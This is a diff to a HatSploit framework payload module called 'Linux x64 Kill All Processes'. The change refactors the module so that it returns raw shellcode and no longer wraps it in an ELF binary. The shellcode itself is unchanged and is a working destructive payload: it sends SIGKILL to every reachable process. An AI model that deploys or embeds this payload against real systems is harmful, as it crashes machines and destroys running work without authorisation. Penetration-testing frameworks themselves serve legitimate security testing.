@@ -5,11 +5,10 @@
 # Current source: https://github.com/EntySec/HatSploit
 #
 
-from hatvenom import HatVenom
 from hatsploit.lib.payload import Payload
 
 
-class HatSploitPayload(Payload, HatVenom):
+class HatSploitPayload(Payload):
     details = {
         'Category': "stager",
         'Name': "Linux x64 Kill All Processes",
@@ -28,9 +27,6 @@ class HatSploitPayload(Payload, HatVenom):
     }
 
     def run(self):
-        shellcode = (
+        return (
             b"\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
         )
-
-        payload = self.generate('elf', 'x64', shellcode)
-        return payload
